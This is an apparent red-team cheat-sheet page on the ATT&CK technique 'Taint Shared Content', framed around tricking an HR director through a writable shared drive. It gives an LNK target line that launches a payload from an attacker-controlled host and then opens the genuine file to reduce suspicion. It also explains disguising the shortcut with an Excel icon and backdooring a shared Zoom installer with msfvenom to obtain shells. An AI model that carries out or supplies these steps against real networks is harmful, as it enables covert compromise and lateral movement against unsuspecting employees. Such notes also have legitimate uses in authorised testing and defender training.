---
title: Taint Shared Content
tags: [lateral-movement, watering-hole, lnk, shared-drives]
description: Compromising content on shared drives (watering holes) to move laterally.
date: 2024-01-02
---

# Taint Shared Content (T1080)

Setting a trap where the users graze.

## 1. The Scenario
You are on a workstation. You see a mapped drive `Z: \HR_Share`. You can Write to it.
- **Goal**: Compromise the HR Director.

## 2. LNK Files (Shortcut Tampering)
- **Attack**: Replace `Salary_Report.xlsx` with `Salary_Report.lnk`.
- **Target**:
  ```bash
  # LNK Target
  cmd.exe /c start \\AttackerIP\Payload.exe & start \\FileServer\Real_Report.xlsx
  ```
- **Icon**: Change the LNK icon to look like Excel.
- **Result**: User clicks, gets a shell, and the real file opens (to reduce suspicion).

## 3. Backdooring Installers
If IT puts software installers on a share (`\\IT_Share\Installers\ZoomInstaller.exe`).
- **Attack**: Use **Msfvenom** or a binder to add your payload to `ZoomInstaller.exe`.
- **Result**: Next time IT installs Zoom on a new laptop, you get a shell.
